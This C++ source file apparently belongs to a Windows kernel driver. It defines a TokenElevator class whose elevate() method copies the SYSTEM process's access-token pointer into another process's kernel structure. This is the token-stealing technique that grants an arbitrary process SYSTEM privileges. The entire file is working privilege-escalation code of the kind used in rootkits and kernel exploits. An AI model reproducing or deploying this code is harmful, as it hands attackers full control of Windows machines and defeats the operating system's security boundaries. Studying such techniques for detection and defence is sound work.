#include "Offsets.h"
#include "TokenElevator.h"

TokenElevator::TokenElevator(Process& processToElevate)
	: m_processToElevate(processToElevate)
{}

NTSTATUS TokenElevator::elevate() {
	auto systemProcess = Process(SYSTEM_PID);
	const auto systemTokenAddress = reinterpret_cast<ULONG_PTR>(systemProcess.get()) + static_cast<ULONG>(Offsets::accessToken);
	auto targetTokenAddress = reinterpret_cast<ULONG_PTR>(m_processToElevate.get()) + static_cast<ULONG>(Offsets::accessToken);

	*reinterpret_cast<PULONG_PTR>(targetTokenAddress) = *reinterpret_cast<PULONG_PTR>(systemTokenAddress);

	return STATUS_SUCCESS;
}